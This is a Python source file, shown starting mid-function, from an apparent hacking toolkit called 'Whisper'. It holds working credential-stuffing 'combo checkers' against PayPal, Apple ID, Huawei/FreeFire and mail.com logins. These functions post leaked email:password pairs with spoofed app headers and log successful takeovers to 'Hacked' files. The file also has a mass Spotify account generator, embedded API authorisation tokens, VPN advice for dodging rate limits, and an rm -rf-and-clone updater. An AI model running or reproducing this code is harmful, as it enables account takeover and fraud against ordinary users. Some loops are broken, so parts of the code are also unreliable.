'X-Paypal-Consumerapp-Context': '%7B%22deviceLocationCountry%22%3A%22JO%22%2C%22deviceLocale%22%3A%22ar_JO%40numbers%3Dlatn%22%2C%22deviceOSVersion%22%3A%2213.5%22%2C%22deviceLanguage%22%3A%22ar-JO%22%2C%22appGuid%22%3A%22B44DA023-8872-4961-9BD3-DF220E915D1C%22%2C%22deviceId%22%3A%22D002CF30-09C0-4D7E-9085-DC2510E145AB%22%2C%22deviceType%22%3A%22iOS%22%2C%22deviceNetworkCarrier%22%3A%22Zain%20JO%22%2C%22deviceModel%22%3A%22iPhone%22%2C%22appName%22%3A%22com.yourcompany.PPClient%22%2C%22deviceOS%22%3A%22iOS%22%2C%22visitorId%22%3A%22B44DA023-8872-4961-9BD3-DF220E915D1C%22%2C%22deviceNetworkType%22%3A%22Unknown%22%2C%22usageTrackerSessionId%22%3A%2256A2CF37-1F14-4B3D-9065-D70268A6D37B%22%2C%22appVersion%22%3A%228.2.2%22%2C%22sdkVersion%22%3A%221.0.0%22%2C%22deviceMake%22%3A%22Apple%22%7D',
'Authorization': 'Basic QVY4aGRCQk04MHhsZ0tzRC1PYU9ReGVlSFhKbFpsYUN2WFdnVnB2VXFaTVRkVFh5OXBtZkVYdEUxbENxOg==',
'X-Paypal-Fpti': '{"user_guid":"B44DA023-8872-4961-9BD3-DF220E915D1C","user_session_guid":"56A2CF37-1F14-4B3D-9065-D70268A6D37B"}',
'Accept-Language': 'ar',
'Accept-Encoding': 'gzip, deflate',
'Content-Length': '4670',
'X-Paypal-Mobileapp': 'dmz-access-header',
'User-Agent': 'PayPal/74 (iPhone; iOS 13.5; Scale/2.00)',
'Paypal-Request-Id': '1a9154e6b56f43e69f8a96045c33d2ff'}
    data='timeStamp=1630995621211&grantType=password&firstPartyClientAccessToken=A21AAMvAFdCh_wzage8zKXYTT8DBdRy0D4sbmkiKiaEGZ7P_CqKtdPQeLGnBQNUXSIK3nBVmUnDKtZQNxdj-xhpRvhqmJ1fQg&deviceInfo=%7B%22device_identifier%22%3A%22B44DA023-8872-4961-9BD3-DF220E915D1C%22%2C%22device_name%22%3A%22Joker%22%2C%22device_type%22%3A%22iOS%22%2C%22device_key_type%22%3A%22APPLE_PHONE%22%2C%22device_model%22%3A%22iPhone%22%2C%22device_os%22%3A%22iOS%22%2C%22device_os_version%22%3A%2213.5%22%2C%22is_device_simulator%22%3Afalse%2C%22pp_app_id%22%3A%22APP-3P637985EF709422H%22%7D&adsChallengeId=auth-B44DA023-8872-4961-9BD3-DF220E915D1C&authNonce=iRcHcbnucMD1HEfRVMqMRAFoPJSHkYSPisAan9UGwvA%3D&firstPartyClientId=d3aacf450dd6aa992cfba77067560733&postLoginConfig=%7B%22experimentDetails%22%3A%7B%22res%22%3A%22digital_wallet_consumer_client%22%2C%22app%22%3A%22%22%2C%22filters%22%3A%5B%7B%22name%22%3A%22component%22%2C%22value%22%3A%22consapp%22%7D%5D%7D%2C%22configNames%22%3A%5B%22digitalWalletConfig.digitalwalletexperience%22%5D%7D&appInfo=%7B%22device_app_id%22%3A%22com.yourcompany.PPClient%22%2C%22client_platform%22%3A%22Apple%22%2C%22app_version%22%3A%228.2.2%22%2C%22app_category%22%3A3%2C%22app_guid%22%3A%22B44DA023-8872-4961-9BD3-DF220E915D1C%22%2C%22push_notification_id%22%3A%22disabled%22%7D&password='+pess+'&redirectUri=urn%3Aietf%3Awg%3Aoauth%3A2.0%3Aoob&riskData=%7B%22total_storage_space%22%3A63978983424%2C%22linker_id%22%3A%22760d2932-66b3-42db-a256-5fb401bd4646%22%2C%22bindSchemeEnrolled%22%3A%22none%22%2C%22local_identifier%22%3A%22813df9f0-140d-487f-b4ba-3dee3b89a732%22%2C%22screen%22%3A%7B%22brightness%22%3A%2240%22%2C%22height%22%3A1334%2C%22mirror%22%3Afalse%2C%22scale%22%3A%222.0%22%2C%22capture%22%3A0%2C%22width%22%3A750%2C%22max_frames%22%3A60%7D%2C%22conf_version%22%3A%225.0%22%2C%22timestamp%22%3A1630995621177%2C%22comp_version%22%3A%225.3.0%22%2C%22os_type%22%3A%22iOS%22%2C%22is_rooted%22%3Atrue%2C%22payload_type%22%3A%22full%22%2C%22ip_addresses%22%3A%5B%22fe80%3A%3Acf0%3A7688%3Aa200%3A52d4%22%2C%22172.20.10.4%22%2C%22fe80%3A%3Ae068%3A71ff%3Afe98%3A3f2f%22%2C%22fe80%3A%3A7182%3Aaf1d%3A3e52%3A1b8e%22%2C%22fe80%3A%3A8512%3Ac906%3Af8e2%3A9326%22%5D%2C%22device_name%22%3A%22Joker%22%2C%22locale_lang%22%3A%22ar%22%2C%22c%22%3A32%2C%22app_version%22%3A%228.2.2%22%2C%22sr%22%3A%7B%22gy%22%3Atrue%2C%22mg%22%3Atrue%2C%22ac%22%3Atrue%7D%2C%22conf_url%22%3A%22https%3A%5C%2F%5C%2Fwww.paypalobjects.com%5C%2FrdaAssets%5C%2Fmagnes%5C%2Fmagnes_ios_rec.json%22%2C%22os_version%22%3A%2213.5%22%2C%22tz_name%22%3A%22Asia%5C%2FAmman%22%2C%22battery%22%3A%7B%22state%22%3A2%2C%22low_power%22%3A0%2C%22level%22%3A%220.81%22%7D%2C%22user_agent%22%3A%7B%22dua%22%3A%22Mozilla%5C%2F5.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2013_5%20like%20Mac%20OS%20X%29%20AppleWebKit%5C%2F605.1.15%20%28KHTML%2C%20like%20Gecko%29%20Mobile%5C%2F15E148%22%7D%2C%22cpu%22%3A%7B%22activecores%22%3A2%2C%22cores%22%3A2%2C%22state%22%3A0%7D%2C%22ds%22%3Atrue%2C%22tz%22%3A10800000%2C%22TouchIDAvailable%22%3A%22true%22%2C%22vendor_identifier%22%3A%22D002CF30-09C0-4D7E-9085-DC2510E145AB%22%2C%22memory%22%3A%7B%22total%22%3A2105016320%7D%2C%22sms_enabled%22%3Atrue%2C%22magnes_guid%22%3A%7B%22id%22%3A%22d2096fd6-563a-40f5-b397-feda4bff3c34%22%2C%22created_at%22%3A1630973128059%7D%2C%22disk%22%3A%7B%22total%22%3A63978983424%2C%22free%22%3A36076568576%7D%2C%22app_guid%22%3A%22B44DA023-8872-4961-9BD3-DF220E915D1C%22%2C%22system%22%3A%7B%22hardware%22%3A%22arm64%20v8%22%2C%22version%22%3A%2217F75%22%2C%22system_type%22%3A%22arm64%2064%20bit%22%2C%22name%22%3A%22N71AP%22%7D%2C%22pin_lock_last_timestamp%22%3A1630995603069%2C%22source_app_version%22%3A%228.2.2%22%2C%22bindSchemeAvailable%22%3A%22crypto%3Akmli%2Cbiometric%3Afingerprint%22%2C%22risk_comp_session_id%22%3A%22f5ebc7fc-3de5-4b0d-9786-e2434f56b60a%22%2C%22magnes_source%22%3A10%2C%22device_model%22%3A%22iPhone8%2C1%22%2C%22mg_id%22%3A%22e09f4d0d020c349c26c0f0999d460e1e%22%2C%22proxy_setting%22%3A%22host%3D172.20.10.11%2Cport%3D8089%2Ctype%3DkCFProxyTypeHTTPS%22%2C%22email_configured%22%3Afalse%2C%22device_uptime%22%3A61227499%2C%22rf%22%3A%2211011%22%2C%22dbg%22%3Afalse%2C%22cloud_identifier%22%3A%2261851f2d-5061-49f9-a510-972076107601%22%2C%22PasscodeSet%22%3A%22true%22%2C%22is_emulator%22%3Afalse%2C%22t%22%3Atrue%2C%22locale_country%22%3A%22JO%22%2C%22ip_addrs%22%3A%22172.20.10.4%22%2C%22app_id%22%3A%22com.yourcompany.PPClient%22%2C%22pairing_id%22%3A%2208dbd356968d4e64b540848e620ae3f3%22%2C%22conn_type%22%3A%22wifi%22%2C%22TouchIDEnrolled%22%3A%22false%22%2C%22dc_id%22%3A%228e2305b5387bacbea93c339fd6b1730d%22%2C%22location_auth_status%22%3A%22unknown%22%7D&rememberMe=false&email='+eml+'&'
    send=r.post('https://api-m.paypal.com/v1/mfsauth/proxy-auth/token',headers=headers,json=data)
    if error in send.text:
     vv1ck(E+f'[-] Not Hacked -> {eml}:{pess}')
    elif SCOR in send.text:
     vv1ck(E+f'[!] Temporarily closed -> {eml}:{pess}')
    elif log1 in send.text:
     with open('Hacked-paypal.txt', 'a') as J:J.write(eml+':'+pess)
     vv1ck(G+f'[+] Hacked -> {eml}:{pess}')
    elif log2 in send.text:
     with open('Hacked-paypal.txt', 'a') as J:J.write(eml+':'+pess)
     vv1ck(G+f'[+] Hacked -> {eml}:{pess}')
    elif 'challenge' in send.text:
     with open('secure-paypal.txt', 'a') as J:J.write(eml+':'+pess)
     vv1ck(S+f'[!] secure account -> {eml}:{pess}')
    elif send.status_code == 403:exit(' Oops ?, You have been temporarily blocked, please turn on the VPN')
    elif send.status_code == 429:exit(' Oops ?, You have been temporarily blocked, please turn on the VPN')
def appleid():
  error = '"الـ Apple ID الخاص بك أو كلمة السر غير صحيحة."'
  error2="تم قفل هذا الـ Apple ID"
  yes = 'authType'
  donE=20
  r=requests.session()
  hi='I always see you :)'
  os.system('clear')
  print(logo)
  file=input('[+] Combo List Name : ')
  print('====================================')
  while True:
   for i in open(file,"r").read().splitlines():
    pess=i.split(":")[1]
    applID=i.split(":")[0]
    headers={"Accept": "application/json, text/javascript, */*; q=0.01","User-Agent": "Mozilla/5.0 (Whisper@itzthedevil) Gecko/20100101 Firefox/91.0","X-Apple-Locale":"QT-AR","X-Apple-Trusted-Domain": "https://idmsa.apple.com","Origin": "https://idmsa.apple.com","X-Requested-With": "XMLHttpRequest"}
    send = r.post('https://idmsa.apple.com/appleauth/auth/signin',headers=headers,json={"accountName":applID,"rememberMe":"false","password":pess}).text
    if yes in send:
        vv1ck(f'{G}[√] Hacked ==> {applID} | {pess}')
        with open('Hacked-appleID.txt', 'a') as J:
            J.write(f'{applID}:{pess}')
    elif error in send:
        vv1ck(f'{E}[-] Not Hacked AppleID: {applID} | {pess}')
    elif error2 in send:
        vv1ck(f'{S}[!] This AppleID locked: {applID} | password : {pess}')
        with open('closed-appleID.txt', 'a') as J:
             J.write(applID+' ==> '+pess)
    else:pass
def freefire():
 os.system('clear')
 print(logo)
 file=input('[+] Combo List Name : ')
 print('====================================')
 while True:
  for i in open(file,"r").read().splitlines():
   pess=i.split(":")[1]
   user=i.split(":")[0]
  chars="qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm12345678901234567890"
  for ptk in range(1):
   ptk=""
  for item in range(30):
   ptk+=random.choice(chars)
  for ptkk in range(1):
   ptkk=""
  for item in range(30):
   ptkk+=random.choice(chars)
  a=ptkk
  ptkk=f'{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h'
  head={
		'Accept': 'application/json, text/plain, */*',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
		'Conection': 'keep-alive',
		'Content-Length': '1063',
		'Content-Type': 'application/x-www-form-urlencoded',
		'cookie': 'JSESSIONID=4617BD52451B937CFE9D9D032623AA53240C1B88E5D67D87; VERSION_NO=UP_CAS_5.2.0.100; CAS_THEME_NAME=huawei',
		'Host': 'id7.cloud.huawei.com',
		'Origin': 'https://oauth-login.cloud.huawei.com',
		'Referer': 'https://oauth-login.cloud.huawei.com/',
		'sec-ch-ua': '\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"',
		'sec-ch-ua-mobile': '?0',
		'Sec-Fetch-Dest': 'empty',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Site': 'same-site',
		'User-Agent': generate_user_agent(),}
  data=f'pageToken={ptk}&pageTokenKey={ptkk}&loginUrl=https%3A%2F%2Fid7.cloud.huawei.com%3A443%2FCAS%2Fportal%2FloginAuth.html&service=https%3A%2F%2Foauth-login7.cloud.huawei.com%2Foauth2%2Fv2%2Flogin%3Fclient_id%3D100886055%26display%3Dpage%26flowID%3D1a87820c-7f65-4175-b728-71827da1cafd%26h%3D1617962729.5430%26lang%3Den-us%26redirect_uri%3Dhttps%253A%252F%252F100067.connect.garena.com%252Foauth%252Flogin%253Fresponse_type%253Dtoken%2526locale%253Dzh-TW%2526redirect_uri%253Dhttps%25253A%25252F%25252Freward.ff.garena.com%25252F%2526client_id%253D100067%2526all_platforms%253D1%2526platform%253D7%26response_type%3Dcode%26scope%3Dopenid%2Bhttps%253A%252F%252Fwww.huawei.com%252Fauth%252Faccount%252Fbase.profile%26v%3Da60d2237058821bae0939d3777d9de5f5552e2ad07d4fe0ee70babb3b3dd3644&loginChannel=90000300&reqClientType=90&lang=en-us&isThirdBind=0&hwmeta=&userAccount={user}&password={pess}&clientID=100886055&languageCode=en-us'
  time.sleep(10)
  req=requests.post(f'https://id7.cloud.huawei.com/CAS/IDM_W/ajaxHandler/remoteLogin?reflushCode=0.9373766246178068',headers=head,data=data,timeout=3)
  if req.json()['isSuccess']==1:
			c=str(req.json()['callbackURL'])
			print(G+'--------------------------------')
			print(f'Hacked: [{user}:{pess}] ')
			print('need Verify Or ChangePhone:', req.json()['needVerifyOrChangePhone'])
			print('need Pop Trust:', req.json()['needPopTrust'])
			print('qrCode Login SuccessFlag:', req.json()['qrCodeLoginSuccessFlag'])
			print('Country Code:', c.split('countryCode=')[1])
			print("[/] Enjoy")
			print('--------------------------------')
			with open('GOOD.txt', 'a') as x:
				x.write(f'{user}:{pess}' + '\n')
  elif req.json()['errorCode']=='10000400':
   print(E+f"NOT HACKED ERROR 1 : [{user}:{pess}]")
   try:
    if req.json()["errorCode"]=='10000510':
     print(E+f"NOT HACKED ERROR 2 : [{user}:{pess}]")
    elif 'Warning: try login too many times.' in req.text:
     print(E+f"NOT HACKED-Ban coming : [{user}:{pess}]")
    elif req.json()['errorCode']=='10002058':
     print(E+f"NOT HACKED-Ban : [{user}:{pess}]")
    elif req.json()['errorCode']=='10001105':
     print(E+f"NOT HACKED ERROR 3 : [{user}:{pess}]")
    elif 'fail to check randomCode.' in req.text:
     print(E+'Fail Come Back Later')
    else:
     print(E+f"NOT HACKED ERROR 4 : [{user}:{pess}]")
   except:
    pass
def mail():
	yes='access_token';no='Perm.ACCOUNT_NOT_FOUND_OR_PASSWORD_WRONG';donE=20
	os.system('clear')
	print(logo)
	file=input('[+] Combo List Name : ')
	print('====================================')
	while True:
	 for i in open(file,"r").read().splitlines():
	  pess=i.split(":")[1]
	  user=i.split(":")[0]
	headers={
	'Host': 'oauth2.mail.com',
	'Accept': '*/*',
	'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
	'Authorization': 'Basic bWFpbGNvbV9tYWlsYXBwX2lvczpFcTg3Wlc3VzZ0Vm9mbHFIWXpEVWx4bHZ6MXFOUFpYcGJvS0EwZzd0',
	'Content-Length': '97',
	'Accept-Language': 'ar',
	'X-Ui-Track-Operation': 'PACSCreateRefreshTokenOperation',
	'User-Agent': 'mail.com/6127 CFNetwork/1126 Darwin/19.5.0',
	'X-Ui-App': 'mailcom.ios.iosmail/8.26.6127',
	'Accept-Encoding': 'gzip, deflate',
	'Connection': 'close'}
	send=r.post('https://oauth2.mail.com/token',headers=headers,data='device%5Fname=iOS%5FDevice&username='+eml+'&password='+pess+'&grant%5Ftype=password')
	if yes in send.text:
		vv1ck(f'{G}[+] Hacked: {eml}:{pess}')
		with open('Hacked-mail.txt', 'a') as J:J.write(eml+':'+pess+'\n')
	elif no in send.text:vv1ck(f'{E}[-] Not hacked: {eml}:{pess}')
	elif send.status_code == 429:exit(E+'[!] ERROR ...')
	else:vv1ck(send.text)
def spotify():
 os.system('clear')
 print(logo)
 while True:
  pss='whisper123@@'
  letters='1234567890qwertyuiopasdfghjklzxcvbnm'
  NAME=''.join(random.choice(letters) for i in range(4))
  amm='whisper_'+''.join(random.choice(letters) for i in range(6))+'@whisper.dz'
  spotify=(f'[√] Spotify Account ==> {amm} | {pss}')
  data={'gender':'male','password':pss,'password_repeat':pss,'birth_month':'11','birth_year':'2002','creation_point':'client_mobile','email':amm,'birth_day':'22','displayname':NAME,'key':'bff58e9698f40080ec4f9ad97a2f21e0','platform':'iOS-ARM','creation_flow':'mobile_email','iagree':'1',}
  head={'content-type':'application/x-www-form-urlencoded','Host':'spclient.wg.spotify.com','Content-Type':'application/x-www-form-urlencoded','Connection':'keep-alive','Accept':'*/*','User-Agent':'Spotify/8.5.7 iOS/13.5.1 (iPhone12,8)','Accept-Language':'en, en;q=0.01','Content-Length':'283','Accept-Encoding':'gzip, deflate, br'}
  response=requests.post('https://spclient.wg.spotify.com/signup/public/v1/account',headers=head,data=data).json()
  print(f'{G}{spotify}')
  with open('Spotify.txt', 'a') as J:J.write(spotify+'\n')
def links():
 r=requests.session()
 os.system('clear')
 print(logo)
 webIP=input('[+] WebSite IP ==> ')
 print(S+'====================================')
 print(r.get(f'https://api.hackertarget.com/pagelinks/?q=www.{webIP}.com').text)
def scanner():
	os.system('clear')
	print(logo)
	re=requests.session()
	webIP=input('[+] WebSite IP ==> ')
	print(S+'====================================')
	headers ={
	'Host': f'{webIP}.com.w3snoop.com',
	'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	'Accept-Language': 'en-US,en;q=0.5',
	'Accept-Encoding': 'gzip, deflate',
	'Upgrade-Insecure-Requests': '1',
	'Sec-Fetch-Dest': 'document',
	'Sec-Fetch-Mode': 'navigate',
	'Sec-Fetch-Site': 'none',
	'Sec-Fetch-User': '?1',
	'Cache-Control': 'max-age=0',
	'Te': 'trailers',
	'Connection': 'close'}
	send = r.get(f'https://{webIP}.com.w3snoop.com/',headers=headers).text
	Server_IP =re.findall('class=text-primary>Server IP Address:<td>(.*?)<tr><td',send)
	inline =re.findall(f'class=d-inline>(.*?)</h2><div>(.*?)</div>',send)
	age =re.findall(f'class=text-primary>Age:<td>(.*?)<tr><td',send)
	Dmn_Created =re.findall(f'class=text-primary>Domain Created:<td>(.*?)<tr><td',send)
	Dmn_Updated =re.findall(f'class=text-primary>Domain Updated:<td>(.*?)<tr><td',send)
	Dmn_Expires =re.findall(f'class=text-primary>Domain Expires:<td>(.*?)</table>',send)
	print(inline[0])
	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
	Country =re.findall(f'class=text-primary>Country:<td>(.*?)<br><img',send)
	print('[+] Country: '+ Country[0])
	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
	print('[+] Information about the domain: ')
	print('[+] Age: '+age[0])
	print('[+] Domain Created: '+Dmn_Created[0])
	print('[+] Domain Updated: '+Dmn_Updated[0])
	print('[+] Domain Expires: '+Dmn_Expires[0])
	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
	print('[+] IP wepsite: '+str(IPhost))
	print('[+] Server IP Address : '+str(Server_IP[0]))
	if 'instagram.com' in send:
		print('DNS Lookup :\n [    Host	     IP Address	      TTL ]')
		ip5 =re.findall(f'class=snoop-table-alt-heading>TTL</span><tbody><tr><td>(.*?)<td>(.*?)<td>IN<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>IN<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>IN<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>IN<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>IN<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>IN<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>IN<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>IN<td>(.*?)</table>',send)
		print(ip5[0])
	elif 'tiktok.com' in send:
		print('DNS Lookup :\n [    Host	     IP Address	      TTL ]')
		tikHOST =re.findall(f'class=snoop-table-alt-heading>TTL</span><tbody><tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)</table>',send)
		print(tikHOST[0])
	elif 'snapchat.com' in send:
		print('DNS Lookup :\n [    Host	     IP Address	      TTL ]')
		snapHOST =re.findall(f'class=snoop-table-alt-heading>TTL</span><tbody><tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)</table>',send)
		print(snapHOST[0])	
	else:
		try:
			print('DNS Lookup :\n [    Host	     IP Address	      TTL ]')
			none =re.findall(f'class=snoop-table-alt-heading>TTL</span><tbody><tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)</table>',send)
			print(none[0])
		except IndexError:
			pass
	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
	try:
		Safety =re.findall(f'class=not-available></div><tr><td>WOT Trustworthiness:<td>(.*?)<tr><td>WOT Child Safety:<td>(.*?)</table>',send)
		print('[+]WOT Trustworthiness | WOT Child Safety')
		print('\t\t \t\t'+str(Safety[0]))
		print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
	except IndexError:
			pass
def login():
 os.system('clear')
 print(logo)
 login=requests.get('https://pastebin.com/raw/MnimEFF8').text
 ue=input(S+'[×] User E-mail ==> ')
 if ue in login:
   print(G+'[√] Tree E-mail')
 else:
   print(E+'[×] Wrong Email')
   login()
 psw=input(S+'[×] User PassWord ==> ')
 if psw in login:
   print(G+'[√] Welcome To My Tool')
   time.sleep(3)
   start()
 else:
   print(E+'[×] Wrong PassWord')
   login()
def up():
 update=requests.get('https://pastebin.com/raw/MnimEFF8').text
 if 'update' in update:
  os.system('clear')
  print(logo)
  print('[+] We Have New Update For You')
  up=input('[+] Want Update The Tool ? y/n : ')
  if up == 'y':
   os.system('cd /$HOME && rm -rf Whisper && git clone https://github.com/whisper-666/Whisper && cd Whisper && python3 Whisper')
  if up == 'n':
   login()
 else:
   print('[×] No Update')
   time.sleep(3)
   login()
def start():
 os.system('clear')
 print(logo)
 whisper=input(f"""{S}[1] FaceBook Cloning
{S}[2] InstaGram Cloning
{S}[3] Twitter Cloning
{S}[4] NetFlix Combo Checker
{S}[5] FaceBook E-mail Checker
{S}[6] InstaGram E-mail Checker
{S}[7] Twitter E-mail Checker
{S}[8] SnapChat E-mail Checker
{S}[9] CrunchyRoll Combo Checker
{S}[10] Noon Combo Checker
{S}[11] FreeFire Combo Checker
{S}[12] AppleID Combo Checker
{S}[13] Mail.com Combo Checker
{S}[14] PayPal Combo Checker
{S}[15] Spotify Generator
{S}[16] WebSite Links
{S}[17] Web Scanner
{Y}====================================
{S}[A] About
{Y}====================================
{S}[U] UpDate
{Y}====================================
{S}[X] Exit
{Y}====================================
{G}[∆] Choose ==> """)
 print('====================================')
 if whisper == 'F':
  os.system('xdg-open https://www.facebook.com/Boy15.Beats')
  start()
 if whisper == 'I':
  os.system('xdg-open https://www.instagram.com/boyftn')
  start()
 if whisper == 'T':
  os.system('xdg-open https://t.me/itzthedevil')
  start()
 if whisper == 'W':
  os.system('xdg-open https://whatsapp.com/+213673336272')
  start()
 if whisper == 'G':
  os.system('xdg-open https://github.com/whisper-666')
  start()
 if whisper == 'f':
  os.system('xdg-open https://www.facebook.com/Boy15.Beats')
  start()
 if whisper == 'i':
  os.system('xdg-open https://www.instagram.com/boyftn')
  start()
 if whisper == 't':
  os.system('xdg-open https://t.me/itzthedevil')
  start()
 if whisper == 'w':
  os.system('xdg-open https://whatsapp.com/+213673336272')
  start()
 if whisper == 'g':
  os.system('xdg-open https://github.com/whisper-666')
  start()
 if whisper == 'U':
  os.system('cd /$HOME && rm -rf Whisper && git clone https://github.com/whisper-666/Whisper && cd Whisper && python3 Whisper')
 if whisper == 'A':
  print(f"""[+] Tool Name : Whisper
[+] Tool Developer : Whisper
[+] Tool UpDate : EveryTime
[+] Tool For Good Ones
[+] I don't Know What to say""")
  input('[+] Back')
  start()
 if whisper == 'X':
  print('[√] GoodBye Friend...\n[√] Thanks For Use My Tool')
 if whisper == '1':
  fbw()
 if whisper == '2':
  insta()
 if whisper == '3':
  twitter()
 if whisper == '4':
  netflix()
 if whisper == '5':
  facebook()
 if whisper == '6':
  instagram()
 if whisper == '7':
  twiter()
 if whisper == '8':
  snapchat()
 if whisper == '9':
  crunchyroll()
 if whisper == '10':
  noon()
 if whisper == '11':
  freefire()
 if whisper == '12':
  appleid()
 if whisper == '13':
  mail()
 if whisper == '14':
  paypal()
 if whisper == '15':
  spotify()
 if whisper == '16':
  links()
 if whisper == '17':
  scanner()
os.system('clear')
print(logo)
ch=print('[+] CheckIng For Update Please Wait...')
up()